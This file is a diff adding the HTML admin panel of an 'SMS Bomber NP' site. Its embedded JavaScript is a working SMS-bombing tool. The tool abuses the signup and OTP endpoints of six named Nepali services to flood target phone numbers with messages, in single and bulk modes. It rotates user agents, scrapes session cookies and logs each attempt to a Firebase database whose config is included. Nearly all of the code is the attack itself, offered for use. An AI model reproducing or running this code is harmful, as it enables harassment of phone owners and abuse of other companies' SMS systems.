@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    
+    <title>Admin Panel — SMS Bomber NP</title>
+    <meta name="description" content="Admin panel for SMS Bomber NP. Secure Firebase authentication.">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <link rel="icon" type="image/png" href="/favicon/favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/svg+xml" href="/favicon/favicon.svg">
+    <link rel="shortcut icon" href="/favicon/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
+    <link rel="manifest" href="/favicon/site.webmanifest">
+    <meta name="theme-color" content="#0f172a">
+
+    <style>
+        :root {
+            --bg: #f8fafc; --bg-alt: #ffffff; --bg-hover: #f1f5f9;
+            --text: #0f172a; --text-secondary: #475569; --text-muted: #94a3b8;
+            --border: #e2e8f0; --red: #dc2626; --red-hover: #b91c1c;
+            --red-light: #fef2f2; --blue: #1e40af; --green: #059669;
+            --green-light: #d1fae5; --amber: #d97706; --amber-light: #fffbeb;
+            --radius: 8px; --shadow: 0 1px 3px rgba(0,0,0,0.04);
+            --shadow-lg: 0 4px 20px rgba(0,0,0,0.06); --transition: 0.2s ease;
+            --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        [data-theme="dark"] {
+            --bg: #0b1120; --bg-alt: #111827; --bg-hover: #1e293b;
+            --text: #e2e8f0; --text-secondary: #94a3b8; --text-muted: #64748b;
+            --border: #1e293b; --red: #ef4444; --red-hover: #dc2626;
+            --red-light: #450a0a; --blue: #3b82f6; --green-light: #064e3b; --amber-light: #451a03;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: var(--font); background: var(--bg); color: var(--text);
+            line-height: 1.6; -webkit-font-smoothing: antialiased;
+            transition: background 0.4s, color 0.4s; min-height: 100vh;
+            display: flex; flex-direction: column;
+        }
+        .container { width: 100%; max-width: 1100px; margin: 0 auto; padding: 0 16px; }
+
+        /* NAV */
+        .nav {
+            position: sticky; top: 0; z-index: 100; height: 56px;
+            background: rgba(248,250,252,0.88); backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border);
+        }
+        [data-theme="dark"] .nav { background: rgba(11,17,32,0.88); }
+        .nav-inner { display: flex; align-items: center; justify-content: space-between; height: 100%; }
+        .nav-logo { font-weight: 800; font-size: 1rem; color: var(--text); text-decoration: none; display: flex; align-items: center; gap: 8px; }
+        .nav-logo img { width: 28px; height: 28px; border-radius: 5px; }
+        .nav-logo em { font-style: normal; color: var(--red); }
+        .nav-end { display: flex; align-items: center; gap: 8px; }
+        .btn {
+            display: inline-flex; align-items: center; gap: 5px; padding: 8px 16px;
+            border-radius: var(--radius); font-size: 0.8rem; font-weight: 600;
+            cursor: pointer; transition: var(--transition); text-decoration: none;
+            border: 1.5px solid transparent; font-family: var(--font); white-space: nowrap;
+        }
+        .btn-red { background: var(--red); color: #fff; }
+        .btn-red:hover { background: var(--red-hover); }
+        .btn-ghost { background: transparent; border-color: var(--border); color: var(--text); }
+        .btn-ghost:hover { background: var(--bg-hover); }
+        .btn-green { background: var(--green); color: #fff; }
+        .btn-green:hover { background: #047857; }
+        .btn-sm { padding: 5px 10px; font-size: 0.7rem; }
+        .icon-btn {
+            width: 32px; height: 32px; border-radius: 50%; border: 1.5px solid var(--border);
+            background: transparent; cursor: pointer; display: flex; align-items: center;
+            justify-content: center; color: var(--text-secondary);
+        }
+        .icon-btn:hover { background: var(--bg-hover); }
+        .icon-btn svg { width: 14px; height: 14px; }
+
+        /* LOGIN */
+        .login-wrap { display: flex; align-items: center; justify-content: center; min-height: 80vh; padding: 20px; }
+        .login-card {
+            background: var(--bg-alt); border: 2px solid var(--border);
+            border-radius: 14px; padding: 28px; width: 100%; max-width: 380px;
+            box-shadow: var(--shadow-lg); text-align: center;
+        }
+        .login-card .shield {
+            width: 48px; height: 48px; border-radius: 50%; background: var(--red-light);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 14px; border: 2px solid var(--red);
+        }
+        .login-card .shield svg { width: 22px; height: 22px; color: var(--red); }
+        .login-card h1 { font-size: 1.1rem; font-weight: 800; margin-bottom: 4px; }
+        .login-card p { font-size: 0.78rem; color: var(--text-muted); margin-bottom: 18px; }
+        .field { margin-bottom: 10px; text-align: left; }
+        .field label { display: block; font-size: 0.74rem; font-weight: 600; margin-bottom: 4px; }
+        .field-inp {
+            width: 100%; padding: 9px 12px; border: 1.5px solid var(--border);
+            border-radius: var(--radius); font-size: 0.84rem; font-family: var(--font);
+            background: var(--bg); color: var(--text); outline: none; transition: var(--transition);
+        }
+        .field-inp:focus { border-color: var(--red); }
+        .field-inp.error { border-color: var(--red); background: var(--red-light); }
+        .field-err { font-size: 0.66rem; color: var(--red); margin-top: 2px; display: none; }
+
+        /* DASHBOARD */
+        .dashboard { display: none; padding: 20px 0 40px; }
+        .dash-header {
+            display: flex; align-items: center; justify-content: space-between;
+            flex-wrap: wrap; gap: 10px; margin-bottom: 16px;
+            padding-bottom: 12px; border-bottom: 1.5px solid var(--border);
+        }
+        .dash-header h2 { font-size: 1.1rem; font-weight: 800; }
+        .dash-header .user { font-size: 0.78rem; color: var(--text-secondary); }
+
+        /* TABS */
+        .tabs { display: flex; gap: 0; margin-bottom: 16px; border: 1.5px solid var(--border); border-radius: var(--radius); overflow: hidden; }
+        .tab { flex: 1; padding: 8px; text-align: center; font-size: 0.74rem; font-weight: 600; cursor: pointer; background: var(--bg-alt); color: var(--text-secondary); border: none; font-family: var(--font); }
+        .tab.active { background: var(--red); color: #fff; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        /* CARDS */
+        .card {
+            background: var(--bg-alt); border: 1.5px solid var(--border);
+            border-radius: var(--radius); padding: 16px; margin-bottom: 12px;
+            box-shadow: var(--shadow);
+        }
+        .card h3 { font-size: 0.82rem; font-weight: 700; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
+        .card h3 svg { width: 16px; height: 16px; color: var(--red); }
+        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .row-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
+        .gateway-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; }
+        .gateway-chip {
+            display: flex; align-items: center; gap: 6px; padding: 8px 10px;
+            border: 1.5px solid var(--border); border-radius: var(--radius);
+            cursor: pointer; font-size: 0.72rem; font-weight: 600; transition: var(--transition);
+        }
+        .gateway-chip.active { background: var(--red-light); border-color: var(--red); }
+        .gateway-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--border); }
+        .gateway-chip.active .gateway-dot { background: var(--red); }
+
+        textarea.field-inp { resize: vertical; min-height: 80px; line-height: 1.5; }
+
+        .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 8px; margin-bottom: 14px; }
+        .stat { background: var(--bg-alt); border: 1px solid var(--border); border-radius: var(--radius); padding: 10px; text-align: center; }
+        .stat .val { font-size: 1.2rem; font-weight: 700; }
+        .stat .lbl { font-size: 0.6rem; color: var(--text-muted); text-transform: uppercase; }
+
+        .table-wrap { background: var(--bg-alt); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
+        .table-head { display: grid; grid-template-columns: 100px 1fr 70px 80px 1fr; padding: 8px 12px; background: var(--bg-hover); font-size: 0.64rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.03em; color: var(--text-muted); gap: 6px; }
+        .table-body { max-height: 350px; overflow-y: auto; }
+        .table-row { display: grid; grid-template-columns: 100px 1fr 70px 80px 1fr; padding: 7px 12px; font-size: 0.7rem; border-bottom: 1px solid var(--border); gap: 6px; align-items: center; }
+        .table-row:last-child { border-bottom: none; }
+        .st-ok { color: var(--green); font-weight: 700; }
+        .st-fail { color: var(--red); font-weight: 700; }
+        .st-blocked { color: var(--amber); font-weight: 700; }
+
+        .terminal {
+            background: var(--bg); border: 1px solid var(--border);
+            border-radius: var(--radius); overflow: hidden; margin-top: 12px;
+        }
+        .terminal-head { padding: 6px 10px; border-bottom: 1px solid var(--border); font-size: 0.64rem; font-weight: 700; text-transform: uppercase; color: var(--text-muted); display: flex; justify-content: space-between; align-items: center; }
+        .terminal-body { padding: 8px 10px; max-height: 180px; overflow-y: auto; font-family: 'SF Mono', monospace; font-size: 0.68rem; line-height: 1.5; }
+        .log { display: flex; gap: 5px; }
+        .log-time { color: var(--text-muted); font-size: 0.6rem; flex-shrink: 0; }
+        .log-ok { color: var(--green); } .log-err { color: var(--red); } .log-info { color: var(--blue); }
+
+        .toast { position: fixed; bottom: 18px; left: 50%; transform: translateX(-50%); padding: 10px 18px; border-radius: var(--radius); font-weight: 600; font-size: 0.76rem; z-index: 300; box-shadow: 0 4px 12px rgba(0,0,0,0.1); display: none; }
+        .toast.ok { background: var(--green); color: #fff; }
+        .toast.err { background: var(--red); color: #fff; }
+
+        @media (max-width: 700px) {
+            .row, .row-3 { grid-template-columns: 1fr; }
+            .table-head, .table-row { grid-template-columns: 80px 1fr 55px; }
+            .table-head span:nth-child(4), .table-head span:nth-child(5),
+            .table-row span:nth-child(4), .table-row span:nth-child(5) { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+<nav class="nav">
+    <div class="container nav-inner">
+        <a href="index.html" class="nav-logo"><img src="/favicon/favicon-96x96.png" alt="">SMS<em>Bomber</em>NP <span style="font-size:0.65rem;color:var(--red);font-weight:700;margin-left:4px">ADMIN</span></a>
+        <div class="nav-end" id="navEnd"></div>
+    </div>
+</nav>
+
+<!-- LOGIN -->
+<div class="login-wrap" id="loginScreen">
+    <div class="login-card">
+        <div class="shield"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div>
+        <h1>Admin Access</h1><p>Sign in with Firebase authentication.</p>
+        <div class="field"><label>Email</label><input type="email" class="field-inp" id="email" placeholder="admin@smsbombernp.com" autocomplete="email"></div>
+        <div class="field"><label>Password</label><input type="password" class="field-inp" id="password" placeholder="Enter password" autocomplete="current-password" onkeydown="if(event.key==='Enter')login()"></div>
+        <div class="field-err" id="loginError"></div>
+        <button class="btn btn-red" id="loginBtn" onclick="login()" style="width:100%;justify-content:center;margin-top:8px">Sign In</button>
+    </div>
+</div>
+
+<!-- DASHBOARD -->
+<div class="dashboard container" id="dashboard">
+    <div class="dash-header">
+        <div><h2>Admin Dashboard</h2><div class="user" id="userEmail"></div></div>
+        <div style="display:flex;gap:6px"><button class="btn btn-ghost btn-sm" onclick="refreshAll()">Refresh</button><button class="btn btn-red btn-sm" onclick="logout()">Logout</button></div>
+    </div>
+
+    <div class="stats-row" id="statsRow">
+        <div class="stat"><div class="val" id="totalLogs">0</div><div class="lbl">Total</div></div>
+        <div class="stat"><div class="val" id="deliveredCount" style="color:var(--green)">0</div><div class="lbl">Delivered</div></div>
+        <div class="stat"><div class="val" id="failedCount" style="color:var(--red)">0</div><div class="lbl">Failed</div></div>
+        <div class="stat"><div class="val" id="blockedCount" style="color:var(--amber)">0</div><div class="lbl">Blocked</div></div>
+        <div class="stat"><div class="val" id="protectedCount" style="color:var(--blue)">0</div><div class="lbl">Protected</div></div>
+    </div>
+
+    <div class="tabs">
+        <button class="tab active" onclick="switchTab('logs')">Logs</button>
+        <button class="tab" onclick="switchTab('sender')">SMS Sender</button>
+    </div>
+
+    <!-- LOGS TAB -->
+    <div class="tab-content active" id="tab-logs">
+        <div class="table-wrap">
+            <div class="table-head"><span>Time</span><span>Phone</span><span>Status</span><span>Gateway</span><span>Referrer</span></div>
+            <div class="table-body" id="logsTable"><div style="padding:30px;text-align:center;color:var(--text-muted)">Loading...</div></div>
+        </div>
+    </div>
+
+    <!-- SENDER TAB -->
+    <div class="tab-content" id="tab-sender">
+        <div class="card">
+            <h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Admin SMS Sender — Full Control</h3>
+            <div class="row">
+                <div class="field"><label>Phone Number</label><input type="text" class="field-inp" id="aPhone" placeholder="98XXXXXXXX" maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,'')"></div>
+                <div class="field"><label>Messages</label><input type="number" class="field-inp" id="aCount" value="1" min="1" max="100"></div>
+            </div>
+            <div class="field" style="margin-top:8px"><label>Select Gateways</label>
+                <div class="gateway-grid" id="gatewayList"></div>
+            </div>
+            <div style="display:flex;gap:8px;margin-top:12px">
+                <button class="btn btn-red" onclick="adminSend(false)" style="flex:1;justify-content:center">Send via Selected</button>
+                <button class="btn btn-green" onclick="adminSend(true)" style="flex:1;justify-content:center">Send via ALL</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="2"/><line x1="8" y1="7" x2="8" y2="17"/><line x1="12" y1="7" x2="12" y2="17"/><line x1="16" y1="7" x2="16" y2="17"/></svg>Bulk Mode</h3>
+            <div class="field"><label>Phone Numbers (one per line)</label><textarea class="field-inp" id="aBulkNums" placeholder="9867844454&#10;9842308880"></textarea></div>
+            <div class="row"><div class="field"><label>Per Number</label><input type="number" class="field-inp" id="aBulkCount" value="1" min="1" max="10"></div></div>
+            <button class="btn btn-red" onclick="adminBulk()" style="width:100%;justify-content:center;margin-top:8px">Send Bulk</button>
+        </div>
+
+        <div class="terminal">
+            <div class="terminal-head">Admin Terminal <button class="btn btn-sm btn-ghost" onclick="document.getElementById('aTerminal').innerHTML=''">Clear</button></div>
+            <div class="terminal-body" id="aTerminal"><div class="log"><span class="log-time">--:--</span><span class="log-info">Admin sender ready. Full access granted.</span></div></div>
+        </div>
+    </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-auth.js";
+    import { getDatabase, ref, query, orderByChild, limitToLast, onValue, get, push } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+
+    const fc = {
+        apiKey: "AIzaSyAxQ0_nu_g0ivWMc820w-mqRpq8JklxUoA",
+        authDomain: "sms-bomber-629df.firebaseapp.com",
+        databaseURL: "https://sms-bomber-629df-default-rtdb.firebaseio.com",
+        projectId: "sms-bomber-629df",
+        storageBucket: "sms-bomber-629df.firebasestorage.app",
+        messagingSenderId: "61309414303",
+        appId: "1:61309414303:web:59a2f5da91cfe9ecc86baa"
+    };
+    const app = initializeApp(fc);
+    const auth = getAuth(app);
+    const db = getDatabase(app);
+
+    // Gateways
+    const GATEWAYS = ['clamphook','ambition','merodoctor','collegeinfo','pariksha','quickconnect'];
+    const GNAMES = {clamphook:'ClampHook',ambition:'Ambition Guru',merodoctor:'MeroDoctor',collegeinfo:'College Info',pariksha:'Pariksha',quickconnect:'QuickConnect'};
+    
+    // Build gateway UI
+    var gwHTML = '';
+    GATEWAYS.forEach(function(g){
+        gwHTML += '<div class="gateway-chip active" id="agw-'+g+'" onclick="this.classList.toggle(\'active\')"><div class="gateway-dot"></div>'+GNAMES[g]+'</div>';
+    });
+    document.getElementById('gatewayList').innerHTML = gwHTML;
+
+    function getSelectedGateways(){
+        var sel = [];
+        GATEWAYS.forEach(function(g){
+            if(document.getElementById('agw-'+g).classList.contains('active')) sel.push(g);
+        });
+        return sel.length ? sel : GATEWAYS;
+    }
+
+    // Utilities
+    var UA = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15","Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0","Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"];
+    function R(){return UA[Math.floor(Math.random()*UA.length)]}
+    function S(l){var s='';for(var i=0;i<l;i++)s+='abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random()*26)];return s}
+    function U(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c=='x'?r:r&0x3|0x8).toString(16)})}
+    function VP(n){var c=n.replace(/[^0-9]/g,'');if(c.startsWith('977'))c=c.slice(3);var vp=['984','985','986','974','975','976','980','981','982','961','962','988','972','973','970'];return c.length===10&&(c.startsWith('98')||c.startsWith('97'))&&vp.indexOf(c.slice(0,3))!==-1?c:null}
+
+    function ST(m,t){var x=document.getElementById('toast');x.textContent=m;x.className='toast '+(t==='ok'?'ok':'err');x.style.display='block';setTimeout(function(){x.style.display='none'},3000)}
+    function aLog(m,t){var d=new Date().toLocaleTimeString('en-US',{hour12:false});var div=document.createElement('div');div.className='log';var c=t==='ok'?'log-ok':t==='err'?'log-err':'log-info';div.innerHTML='<span class="log-time">'+d+'</span><span class="'+c+'">'+m+'</span>';var term=document.getElementById('aTerminal');term.appendChild(div);if(term.children.length>100)term.removeChild(term.firstChild);term.scrollTop=term.scrollHeight}
+
+    // API Functions
+    var F={};
+    F.clamphook=async function(p){var r=await fetch("https://backend.clamphook.com/auth/register",{method:"POST",headers:{"Host":"backend.clamphook.com","Origin":"https://backend.clamphook.com","Content-Type":"application/json","Idempotency-Key":U(),"User-Agent":R()},body:JSON.stringify({mobile:"977-"+p})});if(r.status===200){var d=await r.json();if(d.success&&d.operation==="register_mobile")return{ok:true,msg:"ClampHook"};return{ok:false,msg:d.message}}return{ok:false,msg:"HTTP "+r.status}};
+    F.ambition=async function(p){var h={"Host":"api.ambition.guru","Origin":"https://app.ambition.guru","Referer":"https://app.ambition.guru/","Content-Type":"application/json","Accept":"application/json","fingerprint":"556579844","os":"Android","version":"15","X-Requested-With":"XMLHttpRequest","User-Agent":R()};var r1=await fetch("https://api.ambition.guru/api/web/customer/v3/register",{method:"POST",headers:h,body:JSON.stringify({username:p,token:"",name:S(6),is_register:true,login_type:"mobile_number",type:"customer",purpose:0,country_code:"NP",channel:"sms"})});if(r1.status===200){var d1=await r1.json();if(d1.status===true)return{ok:true,msg:"Ambition"};if(d1.message&&d1.message.includes("already")){var r2=await fetch("https://api.ambition.guru/api/web/customer/v3/mobile-login",{method:"POST",headers:{...h,"Authorization":"Bearer null"},body:JSON.stringify({username:p,token:"",name:"",is_register:"",login_type:"mobile_number",type:"customer",purpose:0,country_code:"NP",channel:"sms"})});if(r2.status===200){var d2=await r2.json();if(d2.status===true)return{ok:true,msg:"Ambition"};return{ok:false,msg:d2.message}}return{ok:false,msg:"HTTP "+r2.status}}return{ok:false,msg:d1.message}}return{ok:false,msg:"HTTP "+r1.status}};
+    F.merodoctor=async function(p){var s=await fetch("https://merodoctor.com/signup",{headers:{"User-Agent":R()}});var ck=s.headers.get("set-cookie")||"";var ci=(ck.match(/ci_session=([^;]+)/)||[])[1]||"";var hd={"Host":"merodoctor.com","Origin":"https://merodoctor.com","Referer":"https://merodoctor.com/signup","Content-Type":"application/x-www-form-urlencoded","Accept":"application/json","X-Requested-With":"XMLHttpRequest","Cookie":"ci_session="+ci,"User-Agent":R()};var r1=await fetch("https://merodoctor.com/login/verifynumber",{method:"POST",headers:hd,body:"mobile_number=%2B977+"+p+"&type=sms"});if(r1.status===200){var d1=await r1.json();if(d1.type==="success")return{ok:true,msg:"MeroDoctor"};var r2=await fetch("https://merodoctor.com/login/sendOtp",{method:"POST",headers:{...hd,"Referer":"https://merodoctor.com/login"},body:"mobileno="+p+"&countrycode=977&type=signup&otp_code=&isresend=Y&mobile_number="+p});if(r2.status===200){var d2=await r2.json();if(d2.type==="success")return{ok:true,msg:"MeroDoctor"};return{ok:false,msg:d2.message}}return{ok:false,msg:d1.message}}return{ok:false,msg:"HTTP "+r1.status}};
+    F.collegeinfo=async function(p){var r=await fetch("https://entrancebase.collegeinfonepal.com/api/auth/send-phone-otp/",{method:"POST",headers:{"Host":"entrancebase.collegeinfonepal.com","Origin":"https://entrance.collegeinfonepal.com","Referer":"https://entrance.collegeinfonepal.com/","Content-Type":"application/json","Accept":"*/*","User-Agent":R()},body:JSON.stringify({phone:p})});if(r.status===200){var d=await r.json();if(d.detail&&d.detail.toLowerCase().includes("sent"))return{ok:true,msg:"CollegeInfo"};return{ok:false,msg:d.detail}}return{ok:false,msg:"HTTP "+r.status}};
+    F.pariksha=async function(p){var r=await fetch("https://backend.pariksha.solutions/api/v2/users/sendOtp",{method:"POST",headers:{"Host":"backend.pariksha.solutions","Origin":"https://pariksha.solutions","Referer":"https://pariksha.solutions/","Content-Type":"application/json","Accept":"*/*","User-Agent":R()},body:JSON.stringify({identifier:p})});if(r.status===200){var d=await r.json();if(d.success)return{ok:true,msg:"Pariksha"};return{ok:false,msg:d.message}}return{ok:false,msg:"HTTP "+r.status}};
+    F.quickconnect=async function(p){var pw=S(10)+'@#1';var r1=await fetch("https://app.quickconnect.biz/api/api/v1/register",{method:"POST",headers:{"Host":"app.quickconnect.biz","Origin":"https://app.quickconnect.biz","Referer":"https://app.quickconnect.biz/sign-up","Content-Type":"application/json","Accept":"application/json","User-Agent":R()},body:JSON.stringify({source:"mobile",password:pw,country_code:"+977",mobile:p})});if(r1.status===201)return{ok:true,msg:"QuickConnect"};var d1=await r1.json();if(d1.message&&d1.message.includes("already")){var r2=await fetch("https://app.quickconnect.biz/api/api/v1/login",{method:"POST",headers:{"Host":"app.quickconnect.biz","Origin":"https://app.quickconnect.biz","Referer":"https://app.quickconnect.biz/login","Content-Type":"application/json","Accept":"application/json","User-Agent":R()},body:JSON.stringify({source:"mobile",password:pw,mobile:p})});if(r2.status===200)return{ok:true,msg:"QuickConnect"};return{ok:true,msg:"Exists"}}return{ok:false,msg:d1.message||"Failed"}};
+
+    async function logToFB(phone,status,gateway){try{push(ref(db,'sms_logs'),{phone:phone,status:status,gateway:gateway||'auto',timestamp:new Date().toISOString(),userAgent:navigator.userAgent.substring(0,100),referrer:'admin-panel'})}catch(e){}}
+
+    // Admin Send
+    window.adminSend = async function(all){
+        var p=VP(document.getElementById('aPhone').value);if(!p){ST('Invalid phone','err');return}
+        var n=parseInt(document.getElementById('aCount').value)||1;if(n>100)n=100;
+        var gateways = all ? GATEWAYS : getSelectedGateways();
+        aLog('Admin sending '+n+' msgs to +977-'+p+' via '+gateways.length+' gateways','log-info');
+        for(var i=1;i<=n;i++){
+            var gw=gateways[Math.floor(Math.random()*gateways.length)];
+            try{var r=await F[gw](p);if(r.ok){aLog('#'+i+' ['+GNAMES[gw]+'] Delivered','ok');logToFB(p,'delivered',gw)}else{aLog('#'+i+' ['+GNAMES[gw]+'] '+r.msg,'err');logToFB(p,'failed',gw)}}
+            catch(e){aLog('#'+i+' Error','err');logToFB(p,'failed','error')}
+            if(i<n)await new Promise(function(r){setTimeout(r,800)});
+        }
+        aLog('Done.','ok');ST('SMS sent!','ok');refreshAll();
+    };
+
+    window.adminBulk = async function(){
+        var nums=document.getElementById('aBulkNums').value.split(/[\n,;\s]+/).filter(function(l){return l.trim()}).map(function(l){return VP(l.trim())}).filter(function(v){return v});
+        if(!nums.length){ST('No valid numbers','err');return}
+        var perNum=parseInt(document.getElementById('aBulkCount').value)||1;if(perNum>10)perNum=10;
+        var gateways=getSelectedGateways();
+        aLog('Bulk: '+nums.length+' numbers x '+perNum+' via '+gateways.length+' gateways','log-info');
+        for(var ni=0;ni<nums.length;ni++){
+            var num=nums[ni];aLog('--- +977-'+num+' ('+(ni+1)+'/'+nums.length+') ---');
+            for(var i=1;i<=perNum;i++){
+                var gw=gateways[Math.floor(Math.random()*gateways.length)];
+                try{var r=await F[gw](num);if(r.ok){aLog('#'+i+' ['+GNAMES[gw]+'] Delivered','ok');logToFB(num,'delivered',gw)}else{aLog('#'+i+' '+r.msg,'err');logToFB(num,'failed',gw)}}
+                catch(e){aLog('#'+i+' Error','err')}
+                if(i<perNum)await new Promise(function(r){setTimeout(r,600)});
+            }
+        }
+        aLog('Bulk done.','ok');ST('Bulk sent!','ok');refreshAll();
+    };
+
+    function switchTab(t){document.querySelectorAll('.tab').forEach(function(x){x.classList.remove('active')});document.querySelectorAll('.tab-content').forEach(function(x){x.classList.remove('active')});document.getElementById('tab-'+t).classList.add('active');event.target.classList.add('active')}
+
+    // Auth
+    window.login = function(){
+        var e=document.getElementById('email').value.trim(),p=document.getElementById('password').value.trim();
+        var err=document.getElementById('loginError'),btn=document.getElementById('loginBtn');
+        err.style.display='none';
+        if(!e||!p){err.textContent='Email and password required';err.style.display='block';return}
+        btn.disabled=true;btn.textContent='Signing in...';
+        signInWithEmailAndPassword(auth,e,p).then(function(){ST('Access granted','ok')}).catch(function(er){
+            var m='Invalid credentials';if(er.code==='auth/user-not-found')m='No account found';if(er.code==='auth/wrong-password')m='Wrong password';if(er.code==='auth/too-many-requests')m='Too many attempts';
+            err.textContent=m;err.style.display='block';btn.disabled=false;btn.textContent='Sign In';
+        });
+    };
+    window.logout = function(){signOut(auth).then(function(){ST('Logged out','ok')})};
+
+    onAuthStateChanged(auth,function(user){
+        if(user){
+            document.getElementById('loginScreen').style.display='none';
+            document.getElementById('dashboard').style.display='block';
+            document.getElementById('userEmail').textContent=user.email;
+            document.getElementById('navEnd').innerHTML='<button class="btn btn-red btn-sm" onclick="logout()">Logout</button>';
+            loadLogs();loadStats();
+        } else {
+            document.getElementById('loginScreen').style.display='flex';
+            document.getElementById('dashboard').style.display='none';
+            document.getElementById('navEnd').innerHTML='<a href="index.html" class="btn btn-ghost btn-sm">Home</a>';
+        }
+    });
+
+    async function loadStats(){
+        var s=await get(ref(db,'sms_logs'));var t=0,d=0,f=0,b=0;
+        s.forEach(function(c){t++;var v=c.val();if(v.status==='delivered')d++;else if(v.status==='blocked')b++;else f++});
+        document.getElementById('totalLogs').textContent=t;document.getElementById('deliveredCount').textContent=d;
+        document.getElementById('failedCount').textContent=f;document.getElementById('blockedCount').textContent=b;
+        var ps=await get(ref(db,'protected_numbers'));var pc=0;ps.forEach(function(){pc++});
+        document.getElementById('protectedCount').textContent=pc;
+    }
+
+    function loadLogs(){
+        var lr=query(ref(db,'sms_logs'),orderByChild('timestamp'),limitToLast(200));
+        onValue(lr,function(snapshot){
+            var logs=[];snapshot.forEach(function(c){logs.push(c.val())});logs.reverse();
+            var html='';logs.forEach(function(l){
+                var time=l.timestamp?new Date(l.timestamp).toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}):'--';
+                var phone=l.phone?'+977-'+l.phone:'--';
+                var status=l.status||'unknown',sc=status==='delivered'?'st-ok':status==='blocked'?'st-blocked':'st-fail';
+                html+='<div class="table-row"><span style="font-size:0.64rem;color:var(--text-muted)">'+time+'</span><span style="font-weight:600">'+phone+'</span><span class="'+sc+'">'+status+'</span><span style="font-size:0.64rem">'+(l.gateway||'auto')+'</span><span style="font-size:0.6rem;color:var(--text-muted)">'+(l.referrer||'direct')+'</span></div>';
+            });
+            document.getElementById('logsTable').innerHTML=html||'<div style="padding:30px;text-align:center;color:var(--text-muted)">No logs yet</div>';
+            loadStats();
+        });
+    }
+
+    window.refreshAll = function(){loadLogs();loadStats();ST('Refreshed','ok')};
+    window.switchTab = switchTab;
+</script>
+</body>
+</html>
